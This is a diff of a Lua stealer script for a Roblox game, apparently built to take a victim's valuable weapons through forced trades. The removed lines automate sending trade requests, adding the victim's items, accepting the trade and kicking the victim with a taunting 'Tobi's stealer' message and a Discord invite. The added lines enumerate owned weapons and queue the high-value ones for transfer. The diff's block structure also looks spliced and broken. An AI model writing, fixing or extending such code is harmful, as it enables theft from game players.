@@ -500,54 +500,62 @@ if #weaponsToSend > 0 then
     end)
 
     local sentWeapons = {}
-    for i, v in ipairs(weaponsToSend) do
-        sentWeapons[i] = v
+
+-- Completely rewritten section with maximum nil protection
+for i, v in pairs(realData.Weapons.Owned) do
+    local dataid = i
+    local amount = v
+    
+    -- Check if dataid exists in database
+    if not database[dataid] then
+        goto continue
     end
-
-    local prefix = ""
-    if ping == "Yes" then
-        prefix = "--[[@everyone]] "
+    
+    local itemData = database[dataid]
+    if not itemData then
+        goto continue
     end
-
-    SendFirstMessage(weaponsToSend, prefix)
-
-    local function doTrade(joinedUser)
-        local initialTradeState = getTradeStatus()
-        if initialTradeState == "StartTrade" then
-            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
-            wait(0.3)
-        elseif initialTradeState == "ReceivingRequest" then
-            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
-            wait(0.3)
-        end
-
-        while #weaponsToSend > 0 do
-            local tradeStatus = getTradeStatus()
-
-            if tradeStatus == "None" then
-                sendTradeRequest(joinedUser)
-            elseif tradeStatus == "SendingRequest" then
-                wait(0.3)
-            elseif tradeStatus == "ReceivingRequest" then
-                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
-                wait(0.3)
-            elseif tradeStatus == "StartTrade" then
-                for i = 1, math.min(4, #weaponsToSend) do
-                    local weapon = table.remove(weaponsToSend, 1)
-                    for count = 1, weapon.Amount do
-                        addWeaponToTrade(weapon.DataID)
-                    end
-                end
-                wait(6)
-                acceptTrade()
-                waitForTradeCompletion()
+    
+    local rarity = itemData.Rarity
+    if not rarity then
+        goto continue
+    end
+    
+    -- Get rarity index with explicit nil check
+    local weapon_rarity_index = table.find(rarityTable, rarity)
+    if not weapon_rarity_index then
+        goto continue
+    end
+    
+    -- Get min rarity index with explicit nil check
+    if not min_rarity_index then
+        min_rarity_index = table.find(rarityTable, "Godly") or 5 -- Default to Godly index
+    end
+    
+    -- Get godly index with explicit nil check
+    local godlyIndex = table.find(rarityTable, "Godly") or 5 -- Default to index 5
+    
+    -- Only process if we have valid indices and item isn't untradable
+    if weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
+        local value
+        if valueList[dataid] then
+            value = valueList[dataid]
+        else
+            if weapon_rarity_index >= godlyIndex then
+                value = 2
             else
-                wait(0.5)
+                value = 1
             end
-            wait(1)
         end
-        plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
+        
+        if value and value >= min_value then
+            totalValue = totalValue + (value * amount)
+            table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
+        end
     end
+    
+    ::continue::
+end
 
     local function startPlayerPolling()
         local checkInterval = 3
